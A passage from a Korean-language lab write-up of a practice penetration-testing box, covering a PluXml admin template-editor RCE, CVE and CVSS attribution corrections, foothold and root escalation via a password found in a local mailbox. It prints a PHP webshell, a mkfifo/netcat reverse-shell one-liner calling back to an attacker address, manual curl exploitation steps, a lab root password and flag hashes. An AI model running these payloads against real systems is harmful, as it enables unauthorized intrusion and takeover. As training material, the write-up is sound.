> "While the administrator role has the permission to edit PHP templates and, thus, **can always execute arbitrary code**, the manager role has no such privileges. Indeed, a manager can only edit so-called static — purely HTML-written — pages."

즉 **CVE-2022-25018은 `core/admin/statique.php` / `editStatique()` 경로**이고, **manager 권한**으로도 RCE가 된다는 것이 요지다. 우리가 쓴 것은 **관리자 전용 템플릿 편집기(`parametres_edittpl.php`)** 로 완전히 다른 파일이다.

**올바른 매핑:**

| CVE | 실제 대상 | 필요 권한 | 영향 버전 | CVSS (점수 출처) | CWE |
|---|---|---|---|---|---|
| CVE-2022-25018 | 정적 페이지 (`statique.php` / `editStatique`) | **manager** (발견자 PDF 근거) | 5.8.7 | 8.8 HIGH `PR:L` — **NVD Primary** | CWE-94 |
| **CVE-2024-48138** | **`parametres_edittpl.php` 템플릿 편집기** ← **이 박스에서 실제로 쓴 것** | **admin** (소스 근거: `checkProfil(PROFIL_ADMIN)`) | "v5.8.16 and lower" | 9.8 CRITICAL `PR:N` — **CISA-ADP Secondary** (NVD Primary 점수 **없음**) | CWE-94 |
| CVE-2024-22636 | 정적 페이지 RCE **재발** | **[가정]** manager (NVD 본문에 권한 언급 없음, `PR:L` 에서 추론) | 5.8.9 | 8.8 HIGH `PR:L` — NVD Primary + ADP Secondary | **`NVD-CWE-noinfo`** |

> [!danger] 이 표의 둘째 줄은 **한 줄 안에서 자기모순이었다** — 초판을 정정한다
> 초판은 CVE-2024-48138을 "**9.8 CRITICAL** / 필요 권한 **admin**"으로 같은 줄에 적었다. **양립할 수 없다.**
> 9.8 을 만드는 벡터는 `CVSS:3.1/AV:N/AC:L/**PR:N**/UI:N/S:U/C:H/I:H/A:H` 이고 **`PR:N` 은 "권한 불필요"** 라는 뜻이다. 그런데 이 노트가 2-2에서 직접 인용한 소스는 `$plxAdmin->checkProfil(PROFIL_ADMIN);` 으로 **관리자 세션을 요구**한다. **표가 9.8 의 근거를 스스로 부정한 셈**이다.
>
> **NVD API 실측** — 이 CVE에는 **NVD Primary 점수가 아예 없다.** 유일한 점수가 CISA-ADP(`134c704f-9b21-4f2e-91b3-4a467353bcc0`)의 **Secondary** 이고, 그 벡터의 `PR:N` 이 부정확하다:
> ```
> cvssMetricV31  134c704f-…-4a467353bcc0  Secondary  9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
> ```
> 실제 소스 기준으로는 **`PR:H`(관리자)** 가 맞고, 그러면 점수는 7점대로 내려간다.
>
> **일반화 — CVSS 점수를 인용할 때는 반드시 출처와 벡터를 함께 본다.** NVD 상세 페이지는 Primary·Secondary(ADP·CNA)를 **나란히** 보여주고, 자동 부여된 ADP 점수는 권한 요구를 자주 놓친다. 리포트에 "9.8 CRITICAL"만 옮겨 적으면 **심각도를 부풀린 것**이 되고, 검토자가 벡터를 열어보는 순간 신뢰를 잃는다.
> ```bash
> curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-48138" | jq '.vulnerabilities[0].cve.metrics'
> ```

> [!danger] 공개 익스플로잇의 CVE 표기를 그대로 믿지 마라
> `pluxml-rce`의 README는 **저자가 붙인 참조**일 뿐 벤더·NVD의 판정이 아니다. 그대로 옮겨 적으면 **보고서에 틀린 CVE 번호**가 들어간다.
> OSCP 리포트에서도 실무 침투테스트 보고서에서도 이건 신뢰를 깎는 실수다.
> **확인 절차**: NVD 원문 설명을 읽고 **"어느 파일 / 어느 기능 / 어느 권한"** 이 내가 한 것과 일치하는지 대조한다. 3분이면 된다.
>
> 참고로 이 박스에서는 **CVE 번호가 틀려도 셸은 떨어진다.** 취약점 표기가 중요한 것은 **보고 단계**이지 익스플로잇 단계가 아니다 — 그래서 더 잊기 쉽다.

> [!warning] 릴리스 태그 범위에서는 "패치되지 않는" 결함이다 — **단, master는 다르다**
> PluXml git 실측: `core/admin/parametres_edittpl.php` 의 저장 로직은 **v5.8.7(2021) · v5.8.16 · v5.8.23(2026) 이 사실상 동일**하다. 세 태그 사이의 diff는 `include __DIR__ .'/prepend.php'` ↔ `include 'prepend.php'` 같은 **경로 표기 차이 3곳뿐**이고 **보안 로직은 한 줄도 바뀌지 않았다.**
> ```bash
> $ git diff v5.8.7 v5.8.23 -- core/admin/parametres_edittpl.php
> -include __DIR__ .'/prepend.php';
> +include 'prepend.php';
> ...  (top.php · foot.php 도 같은 형태. 그 외 변경 없음)
> ```
> 벤더는 **"관리자는 PHP 템플릿을 편집할 수 있다"를 정상 기능으로 취급**한다. 발견자 본인도 그렇게 적었다("can always execute arbitrary code").
>
> **[정정] 초판은 "master까지 동일"이라고 적었다 — 반증된다.** master(`HEAD`)는 이 파일을 재작성했고 **`$tpl` 화이트리스트 검사 + `exit`** 를 넣었다:
> ```php
> const TEMPLATE_EXTS_PATTERN = '#(?:php|css|html?|txt|js|xml)#i';
> ...
> # Contrôle du template sélectionné par <select>
> if(!in_array($tpl, $aTemplates)) {
> 	plxMsg::Error(L_CONFIG_EDITTPL_ERROR_NOTHEME);
> 	header('Location: parametres_themes.php');
> 	exit;
> }
> ```
> 즉 master에서는 **2-3의 `home.php` 강제 폴백이 사라지고**, 목록에 없는 `$tpl` 은 저장 단계에 **도달조차 못 한다.** "보안 패치 커밋이 존재하지 않는다"는 초판의 단정도 **과장**이었다.
>
> **그래도 방어 관점의 결론은 유지된다** — 화이트리스트 `$aTemplates` 에는 **`.php` 가 여전히 들어 있고**, 테마에 실재하는 `.php` 템플릿은 그대로 덮어쓸 수 있다. **관리자 = 코드 실행**이라는 성질은 master에서도 살아 있다. 바뀐 것은 "임의 파일명"이 막혔다는 것뿐이다.
> 따라서 통제는 여전히 **관리자 계정 자체를 지키는 것**(강한 비밀번호·MFA·관리 경로 접근 제한)이다(8장). 다만 **"업그레이드는 의미가 없다"고까지 말하면 틀린다.**
>
> 대조적으로 정적 페이지 쪽(CVE-2022-25018)은 패치됐다가 **되돌려졌다**: `15170a27`(2022-04-27 `sanitizePhpTags()` 추가) → `374a401b`(2022-08-01 **Revert**) → 5.8.9에서 재취약(= CVE-2024-22636).

### 2-6. 웹셸과 리버스셸 페이로드

심은 웹셸은 최소 형태다:

```php
<?php system($_GET['cmd']); ?>
```

트리거 경로:

```
http://192.168.132.28/index.php?static1/static-1&cmd=<URL 인코딩된 명령>
```

> [!note] 왜 `/index.php?static1/static-1` 인가
> 1-3에서 확인한 **`mod_rewrite unavailable`** 때문이다. PluXml은 mod_rewrite가 있으면 `/static1/static-1` 같은 예쁜 URL을 쓰지만, 없으면 **`index.php?` 뒤에 쿼리로 붙는 원시 형태**로 동작한다.
> `static-1`은 Information 페이지가 알려준 **`N° of static pages : 1`** 그 페이지다.
> **진단 페이지에서 본 두 정보(모듈 비활성 + 정적 페이지 개수)가 트리거 URL을 직접 결정했다.**

리버스셸 명령:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc 192.168.45.156 4444 >/tmp/f
```

| 조각 | 역할 | 왜 이 형태인가 |
|---|---|---|
| `rm /tmp/f` | 이전 FIFO 제거 | **재시도 시 필수.** 이미 있으면 `mkfifo`가 `File exists`로 실패한다 |
| `mkfifo /tmp/f` | 명명 파이프 생성 | 양방향 통신을 단방향 파이프 두 개로 만든다 |
| `cat /tmp/f \| bash -i 2>&1 \| nc ... >/tmp/f` | 파이프 순환 구성 | nc 출력 → FIFO → bash 입력 / bash 출력 → nc |
| `/usr/bin/bash` | **절대 경로** | 웹셸의 `system()`은 `/bin/sh`(dash)로 돈다. dash에는 `/dev/tcp`가 없으므로 **bash를 명시 호출**해야 한다 |
| `2>&1` | stderr 합류 | 없으면 에러 메시지를 못 본다 |

> [!danger] 왜 `/dev/tcp` 대신 `mkfifo` 인가 — 두 가지 이유
> 1. **`system()` 은 `/bin/sh` 로 실행된다.** Debian의 `/bin/sh`는 **dash**이고 dash에는 `/dev/tcp` 가상 파일이 **없다**
> 2. **`nc -e` 를 못 쓴다.** Debian 기본 `netcat-openbsd`에는 `-e` 옵션이 **컴파일되어 있지 않다**(백도어 방지 목적)
>
> `mkfifo` 방식은 **`-e` 없는 nc에서도 동작**하므로 리눅스에서 가장 범용적이다. **외워둘 값어치가 있는 원라이너**다.
>
> 익스플로잇 저자도 이 취약함을 알고 경고를 달아뒀다: *"change reverse shell type and/or bash path as appropriate"*.
> **[정정] 그 문장은 README가 아니라 `pluxml.py` 76행의 코드 주석이다.** 산출물 실측:
> ```python
>     # change reverse shell type and/or bash path as appropriate
>     rev_shell = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc {rhost} {rport}>/tmp/f'
> ```
> `README.md` 는 228바이트짜리 4줄 문서이고 **리버스셸을 한 번도 언급하지 않는다**(2-5에 전문 인용). 출처를 한 칸 옮겨 적는 것만으로도 **"저자가 문서에 명시했다"와 "코드를 읽어야만 보인다"라는 전혀 다른 사실**이 된다 — 실전 함의가 정반대다. **경고가 주석에만 있다면, 스크립트를 실행만 하는 사람은 영영 못 본다.**

> [!note] `vi pluxml.py` 는 **읽기였고 수정이 아니었다** — 산출물로 확정
> 기록에 `vi pluxml.py` 가 있어 "리버스셸 줄을 손봤을 것"이라고 추정하기 쉽다. **산출물이 그것을 반증한다:**
> ```bash
> ┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
> └─$ git status --porcelain          # 출력 없음 = 추적 파일 수정 없음
> └─$ git diff --stat                 # 출력 없음
> ```
> 파일 타임스탬프도 일치한다 — `pluxml.py` 는 클론 시각(12:56:42)에서 **변하지 않았고**, 디렉터리 mtime만 9초 뒤(12:56:51)로 갱신됐다. **`vi` 가 같은 디렉터리에 스왑 파일을 만들었다 지우면서 디렉터리 mtime만 건드린 흔적**이다(저장소 `.gitignore` 에 `*.swp` 가 있는 것과 정합).
>
> 즉 **기본값 `/usr/bin/bash` 가 그대로 통했다.** Debian 11은 usr-merge가 적용돼 `/bin` 이 `/usr/bin` 심볼릭 링크이므로 `/usr/bin/bash` 가 존재한다.
> **[가정]** usr-merge 이전 시스템(Debian 9 이하 등)이었다면 `/usr/bin/bash` 가 없어 리버스셸이 조용히 실패했을 것이고, README의 경고가 바로 그것을 겨냥한 것으로 본다.
>
> **교훈**: 남의 익스플로잇을 **읽는 것**과 **고치는 것**은 다르다. 여기서는 읽고 나서 "고칠 필요 없다"고 판단한 것이 옳았다.

---

## 3. Foothold

### 3-1. 익스플로잇 확보

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ git clone https://github.com/erlaplante/pluxml-rce.git
Cloning into 'pluxml-rce'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.

┌──(kali㉿kali)-[~/PG/plum]
└─$ ls
nmap.log  pluxml-rce

┌──(kali㉿kali)-[~/PG/plum]
└─$ cd pluxml-rce

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ ls
pluxml.py  README.md

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ vi pluxml.py

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py
[-] Usage:   pluxml.py <URL> <UserName> <Password> <RHOST> <RPORT>
[-] Example: pluxml.py http://example.com admin pass123 192.168.10.10 443
```

![[Pasted image 20260629125838.png]]
![[Pasted image 20260629125852.png]]

> [!tip] 남의 익스플로잇은 **실행 전에 읽는다** — 최소 3가지
> 1. **어디로 요청을 보내는가** (엔드포인트·메서드)
> 2. **성공을 어떻게 판정하는가** (판정이 없으면 그건 "던지기만 하는 도구"다)
> 3. **내 쪽 설정이 필요한가** (리스너·아웃바운드·경로)
>
> `pluxml.py`는 다행히 셋 다 명확하다 — 로그인 실패는 `Incorrect login or password`로 잡아 `sys.exit`하고, 리버스셸이므로 **리스너를 먼저 띄워야 한다.**
> `vi pluxml.py` 로 먼저 열어본 것은 올바른 습관이다.

### 3-2. 실행

리스너를 먼저 띄운다.

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py http://192.168.132.28/ admin admin 192.168.45.156 4444
[+] Attempting login...
[+] Successfully logged in as: admin
[+] Attempting to modify template...
[+] Attemtping to save template...
[+] Check your listener...
```

![[Pasted image 20260629125932.png]]
![[Pasted image 20260629125939.png]]

| 인자 | 값 | 주의점 |
|---|---|---|
| URL | `http://192.168.132.28/` | **스킴 필수.** 스크립트가 이 문자열을 경로와 그대로 이어 붙인다 |
| UserName / Password | `admin` / `admin` | 1-2의 기본 자격증명 |
| RHOST | `192.168.45.156` | **칼리 `tun0` IP.** VPN 재접속마다 바뀐다 — `ip -br a`로 확인 |
| RPORT | `4444` | 리스너 포트와 일치 |

> [!note] `[+] Successfully logged in as: admin` 은 실제 판정이다
> 이 스크립트는 [[pyLoader]]의 `51532.py`와 달리 **응답 본문을 확인**한다:
> ```python
> auth_failed = 'Incorrect login or password'
> if auth_failed in r.text:
>     sys.exit('[-] Error: ' + auth_failed)
> ```
> 그래서 이 메시지는 **믿을 수 있다.** 반면 마지막 줄 `[+] Check your listener...` 는 **아무것도 판정하지 않는다** — 요청을 보냈다는 사실만 알려준다. 판정 근거는 리스너다.

### 3-3. ⚠️ 수동 대안 — 스크립트 없이 브라우저로

> [!danger] 시험 관점 — 이 박스는 자동 도구가 전혀 필요 없다
> **`sqlmap`(명시적 금지)·Metasploit(1대 한정) 둘 다 쓰지 않았다.** `pluxml.py`는 자동 익스플로잇 프레임워크가 아니라 **HTTP 요청 3개를 순서대로 보내는 스크립트**이고, 그 3개는 **브라우저로 손수 할 수 있다.**
> **⚠️ 초판은 여기에 AutoRecon을 같은 줄에 열거했다 — 오해를 부르는 배치다.** [[_WRITEUP-STANDARD]]가 이미 정정한 대로 **AutoRecon은 금지도 제한도 아니다**(열거 전용이라 규정에 언급이 없다). [[pyLoader]] 3-1은 이것을 올바르게 적어 두 노트가 엇갈려 있었다. **plum을 pyLoader에 맞춘다.**
>
> **완전 수동 절차** (스크립트가 깨질 때의 생명줄):
> 1. `http://TARGET/core/admin/auth.php` 에서 `admin`/`admin` 로그인
> 2. 관리 메뉴 → **Display settings → Themes** (또는 직접 `http://TARGET/core/admin/parametres_edittpl.php`)
> 3. 편집기에서 `static.php` 를 선택하고 **Load**
> 4. 내용 끝에 웹셸 한 줄 추가 후 **Save the file**:
>    ```php
>    <?php system($_GET['cmd']); ?>
>    ```
> 5. `curl` 로 명령 실행 — **리버스셸을 띄우기 전에 먼저 실행 여부를 확인한다**:
>    ```bash
>    curl -s --get --data-urlencode 'cmd=id' 'http://TARGET/index.php?static1/static-1'
>    ```
> 6. 확인되면 리버스셸:
>    ```bash
>    curl -s --get --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc LHOST 4444 >/tmp/f' \
>      'http://TARGET/index.php?static1/static-1'
>    ```
>
> **curl 플래그 해설**
>
> | 플래그 | 역할 | 빼면 어떻게 되는가 |
> |---|---|---|
> | `--get` | `--data-*` 로 만든 본문을 **GET 쿼리스트링으로** 보낸다 | 웹셸이 `$_GET['cmd']`를 읽으므로 POST로 보내면 **아무 일도 일어나지 않는다** |
> | `--data-urlencode` | 값을 **자동 URL 인코딩** | `;`·`&`·`|`·공백이 그대로 나가면 **쿼리스트링이 잘려 명령이 반쪽만 실행**된다. `&`가 특히 치명적 |
> | `-s` | 진행률 억제 | 출력이 지저분해진다 |
>
> **⚠️ `--data-urlencode` 를 쓸 때는 값이 아직 인코딩되지 않은 raw 문자열이어야 한다.** 이미 `%20`이 들어 있으면 `%2520`으로 이중 인코딩된다 — [[pyLoader]]에서 `--data-binary`를 써야 했던 것과 정반대 상황이다. **둘의 차이를 헷갈리지 마라.**

### 3-4. 셸 획득 — `www-data`

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.28] 59858
bash: cannot set terminal process group (731): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plum:/var/www/html$ whoami
whoami
www-data
www-data@plum:/var/www/html$ cd
cd
bash: cd: HOME not set
www-data@plum:/var/www/html$ cd /home
cd /home
www-data@plum:/home$
```

![[Pasted image 20260629130031.png]]

> [!warning] `bash: cd: HOME not set` — 웹서버 자식 프로세스의 전형적 증상
> Apache가 띄운 프로세스는 `HOME` 환경변수를 물려받지 않는다. 그래서 인자 없는 `cd`가 실패한다.
> **이것이 나중에 문제가 된다** — `su -` 같은 명령, 그리고 `~/` 로 시작하는 모든 경로가 어긋난다. 셸을 잡자마자 정리해두는 편이 낫다:
> ```bash
> export HOME=/tmp; export TERM=xterm; export PATH=$PATH:/usr/sbin:/sbin
> ```
> `/usr/sbin:/sbin` 추가가 중요하다 — **`netstat`·`ss`·`iptables` 같은 열거 도구가 거기 있다.** 없으면 "command not found"를 도구 부재로 오해한다.

---

## 4. 권한상승

### 4-1. 열거 — 무엇을 봤고 무엇을 읽었는가

**SUID 바이너리:**

> [!warning] 근거 등급 — 아래 블록은 **스크린샷으로 뒷받침되지 않는다**
> 이 박스의 스크린샷 11장 어디에도 `find / -perm -u=s` 화면이 없고, Kali 산출물(`~/PG/plum/`)에도 열거 출력 파일이 없다. 아래 목록은 **초판 노트의 터미널 기록에서 옮긴 것**이며 **재검증되지 않았다.**
> 내용 자체는 Debian 11 기본 SUID 구성과 정합하고 `/usr/sbin/exim4` 라는 결론도 6-①의 산출물(`46996`)과 맞아떨어지지만, **`[가정]` 등급으로 읽어라.** 실행 시각도 미상이다(6-④의 기록 없는 구간 어딘가로 추정).
> **이것이 6-④가 지적하는 문제의 실물이다** — `tee /tmp/enum.txt` 로 남겼다면 등급이 실측이었다.

```bash
find / -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
```

**이 목록을 읽는 법** — 대부분은 노이즈다:

| 항목 | 판정 |
|---|---|
| `chsh`·`chfn`·`passwd`·`gpasswd`·`newgrp`·`su`·`sudo`·`mount`·`umount`·`fusermount` | **Debian 기본 SUID.** 전부 정상이며 그 자체로는 경로가 아니다 |
| `dbus-daemon-launch-helper`·`ssh-keysign`·`polkit-agent-helper-1` | 역시 기본 구성 |
| **`/usr/bin/pkexec`** | CVE-2021-4034(**PwnKit**) 대상이었다. **[가정]** Debian 11 + Apache 2.4.56(2023년 빌드) 조합이면 **2022년 1월 패치가 이미 반영**돼 있을 것이다. **이 박스에서는 시도하지 않았다** |
| ★ **`/usr/sbin/exim4`** | **비기본 항목이자 유일하게 눈에 띄는 것.** 여기로 갔고, **실패했다**(6-①) |

> [!tip] SUID 목록에서 신호와 노이즈를 가르는 기준
> **"이 배포판 기본 설치에 원래 있는가?"** 만 물으면 된다. 위 목록에서 **`exim4` 하나만** 기본이 아니다.
> 기본 목록을 외우기 어렵다면 반대로 접근한다 — **GTFOBins에 있는 이름이 보이면 표시**한다: `find`·`vim`·`nano`·`python`·`perl`·`awk`·`less`·`more`·`nmap`·`tar`·`zip`·`bash`·`cp`·`env`.
> **이 박스에는 GTFOBins 항목이 하나도 없다.** 그 사실 자체가 "SUID는 길이 아니다"라는 신호였다.

**리스닝 포트** — 여기에 진짜 단서가 있었다:

```bash
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
```

![[Pasted image 20260629142834.png]]

> [!danger] `127.0.0.1:25` — nmap이 절대 볼 수 없었던 서비스
> 외부 스캔에는 22/80만 보였다. **루프백 전용 바인드는 원격 스캔에 원리적으로 안 잡힌다.**
> **셸을 잡으면 반드시 다시 열거한다:**
> ```bash
> ss -lntup            # 또는 netstat -tulpn
> ```
> 여기서 25번(SMTP)이 보이는 순간 두 가지가 확정된다:
> 1. **로컬 MTA가 돈다** → 1-3의 `Mail sending function available` 체크와 일치
> 2. **메일함이 존재한다** → `/var/spool/mail/` 을 봐야 한다 ← 이것이 정답이었다

### 4-2. 메일함에서 root 자격증명

> [!warning] 근거 등급 — `cd` 까지는 실측, `ls -al` 출력부터는 **[가정]**
> `netstat` 스크린샷(`…142834.png`)의 마지막 줄이 **`cd /var/spool/mail`** 이므로 **거기까지는 실측**이다. 그러나 다음 스크린샷(`…142856.png`)은 **메일 본문의 `Return-path:` 부터** 시작한다 — 그 사이의 `ls` · `ls -al` · `cat www-data` 명령줄과 mbox 첫 줄(`From root@localhost Fri Aug 25 …`)은 **화면에 없다.**
> 아래 `ls -al` 블록은 **초판의 터미널 기록에서 옮긴 것**이고 산출물로 재검증되지 않았다. **`[가정]`** 등급이다.
> 반면 **메일 본문 블록은 스크린샷과 한 글자까지 일치**한다(오탈자 `sophisicated`, 제목 끝의 군더더기 `"` 포함) — 실측이다.

```bash
cd /var/spool/mail
ls
www-data
whoami
www-data
ls -al
total 16
drwxrwxr-x  2 root     mail 4096 Jun 29 01:12 .
drwxr-xr-x 12 root     root 4096 Aug 25  2023 ..
-rw-rw----  1 www-data mail 4528 Jun 29 01:12 www-data
cat www-data
```

![[Pasted image 20260629142856.png]]

**파일 소유자가 `www-data`** 다 — 우리가 읽을 수 있다. 내용:

```
From root@localhost Fri Aug 25 06:31:47 2023
Return-path: <root@localhost>
Envelope-to: www-data@localhost
Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400
Received: from root by localhost with local (Exim 4.94.2)
        (envelope-from <root@localhost>)
        id 1qZU6V-0000El-Pw
        for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400
To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
Reply-to: root@localhost
Message-Id: <E1qZU6V-0000El-Pw@localhost>
Date: Fri, 25 Aug 2023 06:31:47 -0400

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator
```

**`root : 6s8kaZZNaZZYBMfh2YEW`** — 평문이다.

> [!danger] 이 메일 헤더에 **Exim 버전이 적혀 있다** — 6장의 실패를 여기서 설명할 수 있었다
> ```
> Received: from root by localhost with local (Exim 4.94.2)
> ```
> **`Exim 4.94.2`**. CVE-2019-10149의 취약 범위는 **4.87 ~ 4.91**이다. **이 한 줄만 읽었어도 exim 익스플로잇이 무의미하다는 것을 알 수 있었다.**
> 그런데 실제 진행 순서는 **exim 익스플로잇을 먼저 시도해 실패한 뒤** 메일함을 봤다. 순서를 뒤집었다면 시간을 아꼈다.
>
> **일반화 — 버전 정보는 예상 밖의 곳에 있다**: 메일 헤더 · HTTP 응답 헤더 · 에러 페이지 · `--version` · 패키지 DB(`dpkg -l | grep exim`) · `/usr/share/doc/<pkg>/changelog.Debian.gz`.
> **익스플로잇을 던지기 전에 버전을 확인하는 것이 항상 더 싸다.**

메일함 뒷부분에는 **우리 자신의 실패 기록**도 남아 있다 — 6장 **③**에서 다룬다.

### 4-3. 자격증명 재사용 → root

```bash
su -
Password: 6s8kaZZNaZZYBMfh2YEW
whoami
root
cat /root/proof.txt
b0d62860a794cb90eb6ac02cee93c579
```

![[Pasted image 20260629142947.png]]

> [!danger] `su` 는 TTY 없이도 동작한다 — **위 스크린샷이 그 증거다**
> 초판은 여기에 이렇게 적었다: *"`su: must be run from a terminal` 은 비밀번호 오류가 아니다. **순수 리버스셸에서는 `su`가 아예 동작하지 않는다.**"* 그리고 공백을 메우려고 **[가정]** *"중간에 PTY 업그레이드를 했거나 기록에서 누락된 것으로 본다"* 를 달았다.
> **둘 다 틀렸다. 그리고 이 노트가 스스로 붙인 증거 이미지가 본문을 반박한다.**
>
> **반증 ① — Kali 실측 (TTY 없음):**
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ tty
> not a tty
> └─$ setsid sh -c "echo wrongpw | su root" < /dev/null
> Password: su: Authentication failure      ← 동작한다
> └─$ su --version
> su from util-linux 2.41.2
> └─$ strings $(readlink -f /bin/su) | grep -i "must be run from a terminal"
> (출력 없음)                                ← 그 에러 문구는 바이너리에 존재하지 않는다
> ```
> util-linux `su` 는 TTY가 없으면 **stdin에서 비밀번호를 읽는다.** Debian 11의 `su` 도 util-linux 제공이다.
>
> **반증 ② (결정적) — 위 `![[Pasted image 20260629142947.png]]` 를 다시 봐라:**
> ```
> su -
> Password: 6s8kaZZNaZZYBMfh2YEW      ← ★ 비밀번호가 화면에 그대로 에코됐다
> whoami
> root
> ```
> **TTY라면 `su` 가 에코를 끈다.** 별표도, 빈칸도 아니고 평문이 그대로 찍혔다는 것은 **TTY가 없어서 `su` 가 stdin을 그냥 읽었다**는 직접 증거다.
> 즉 **PTY 업그레이드는 없었고, 초판이 메우려 한 "기록의 공백"은 처음부터 존재하지 않았다.**
>
> **여기서 배울 것 — 자기가 붙인 증거를 다시 읽어라.** 이 노트는 반박 자료를 본문 바로 위에 게시해 두고도, 배운 대로 외운 일반 지식("`su`는 TTY를 요구한다")을 그 위에 덮어썼다. **화면에 보이는 것이 기억보다 세다.**
>
> **단서 하나** — `su` 가 TTY를 요구하는 구성이 아예 없지는 않다. PAM 설정(`pam_securetty`, 일부 배포판의 `requiretty` 계열)이나 `su` 대체 구현에서는 거부될 수 있다. **그러나 기본 동작은 stdin 읽기다.**
> `sudo` 는 별개다 — `Defaults requiretty` 가 있으면 실제로 거부된다. **`su` 와 `sudo` 를 한 문장에 묶지 마라.**
> 그래도 TTY를 올리는 것 자체는 좋은 습관이다(Ctrl+C·탭 완성·`vi` 때문). 다만 **"`su` 를 쓰려면 필수"라는 이유는 틀렸다:**
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # 또는
> script -qc /bin/bash /dev/null
> ```

> [!tip] `su` vs `su -` — 그리고 왜 여기서 `su -`가 옳았는가
> - `su root` — 환경을 물려받는다. `PWD`가 그대로이고 **`PATH`도 www-data 것**이다
> - **`su -`** — 로그인 셸. `/root`로 이동하고 `PATH`·`HOME`·프로필이 root 것으로 새로 설정된다
>
> 이 박스에서는 3-4에서 본 대로 **`HOME` 이 아예 설정돼 있지 않았다.** `su -`가 그것을 한 번에 정리해준다.
> 권한상승 후 `sbin` 도구(`iptables`·`tcpdump`)가 "command not found"면 **`PATH`를 안 물려받은 것**이다.

> [!danger] 평문 비밀번호를 하나 주우면 **전면 재사용 시험**을 한다
> ```
> ① su -                     ← root부터. 성공하면 나머지가 필요 없다
> ② su <각 로컬 계정>         ← /etc/passwd 에서 UID>=1000 목록
> ③ ssh <계정>@localhost      ← 로컬 셸이 있으면 su가 우선이지만, 안정된 TTY가 필요하면 ssh
> ④ 다른 웹 패널 / DB / 서비스
> ```
> **`su`가 SSH보다 우선이다** — SSH는 `PermitRootLogin`·`AllowUsers`에 막힐 수 있고, 그 거부를 "비밀번호 틀림"으로 오독하기 쉽다.
> 누적 패턴이다: [[Codo]] · [[Scarlet]] · [[Zipper]].

---

## 5. 플래그

| 플래그 | 경로 | 값 | 비고 |
|---|---|---|---|
| **local** | **`/var/www/local.txt`** | `26780c227fb20c4d1eb303a7536de3bd` | ★ **표준 위치가 아니다** |
| **proof** | `/root/proof.txt` | `b0d62860a794cb90eb6ac02cee93c579` | 표준 |

```bash
www-data@plum:/tmp$ cd /var/www
cd /var/www
www-data@plum:/var/www$ ls
ls
html
local.txt
www-data@plum:/var/www$ cat local.txt
cat local.txt
26780c227fb20c4d1eb303a7536de3bd
```

![[Pasted image 20260629140858.png]]

> [!warning] `local.txt` 가 `/home/*/` 에 없다 — 왜인가
> **일반 사용자 계정이 없기 때문**이다. 셸을 잡은 계정이 `www-data`(서비스 계정)이므로 홈 디렉터리가 없다.
> 그래서 랩 제작자가 **`www-data`가 읽을 수 있는 곳** — 웹 루트의 부모인 `/var/www/` — 에 뒀다.
>
> **플래그를 못 찾을 때의 탐색 순서:**
> ```bash
> ls -la /home/*/ 2>/dev/null            # ① 표준 위치
> ls -la /var/www/ /var/www/html/        # ② 웹 계정으로 잡았다면 여기
> ls -la /tmp /opt /srv                  # ③ 흔한 대안
> find / -name "local.txt" -o -name "proof.txt" 2>/dev/null   # ④ 최후
> ```
> ④는 느리니 ①~③을 먼저 친다. [[Squid]]에서도 플래그가 `C:\local.txt`에 있었다 — **표준 위치 가정은 자주 깨진다.**

> [!tip] 시험 증거 형식
> ```bash
> whoami; hostname; ip a; cat /var/www/local.txt
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> **한 화면에** 담겨야 인정된다. 플래그가 2개면 **각각** 찍는다.

---

## 6. 막혔던 지점 / 시행착오

> [!abstract] 이 장이 이 노트의 핵심이다
> 기존 노트는 이 구간을 `"SUID 설정 파일 검색 -> exim4 실패"` 한 줄로 적었다. 산출물에는 **실패한 익스플로잇 파일과 실패의 흔적이 그대로 남아 있었고**, 아래는 그것을 소스·1차 사료·재현 실험으로 복원한 것이다.

